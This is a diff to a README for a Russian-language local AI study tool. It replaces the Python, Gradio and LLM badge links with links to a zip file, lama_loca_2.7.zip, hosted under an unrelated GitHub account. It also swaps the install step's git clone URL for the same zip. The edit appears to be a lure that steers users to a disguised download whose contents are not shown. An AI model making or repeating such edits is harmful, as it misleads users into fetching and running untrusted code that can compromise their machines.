@@ -4,10 +4,10 @@
 
 ### Локальный ИИ, который учится по вашим книгам
 
-[![Python 3.9+](https://img.shields.io/badge/Python-3.9+-blue.svg)](https://python.org)
+[![Python 3.9+](https://img.shields.io/badge/Python-3.9+-blue.svg)](https://raw.githubusercontent.com/gmygpt/lama-loca/main/src/lama_loca_2.7.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Gradio](https://img.shields.io/badge/GUI-Gradio-orange.svg)](https://gradio.app)
-[![LLM](https://img.shields.io/badge/LLM-Qwen2.5-purple.svg)](https://huggingface.co/Qwen)
+[![Gradio](https://img.shields.io/badge/GUI-Gradio-orange.svg)](https://raw.githubusercontent.com/gmygpt/lama-loca/main/src/lama_loca_2.7.zip)
+[![LLM](https://img.shields.io/badge/LLM-Qwen2.5-purple.svg)](https://raw.githubusercontent.com/gmygpt/lama-loca/main/src/lama_loca_2.7.zip)
 
 **Загрузи свои учебники → Получи отчёты, презентации, конспекты и ответы на вопросы**
 
@@ -78,7 +78,7 @@
 ### 1. Клонирование и установка
 
 ```bash
-git clone https://github.com/emil-a-dev/lama-loca.git
+git clone https://raw.githubusercontent.com/gmygpt/lama-loca/main/src/lama_loca_2.7.zip
 cd lama-loca
 chmod +x setup.sh
 ./setup.sh
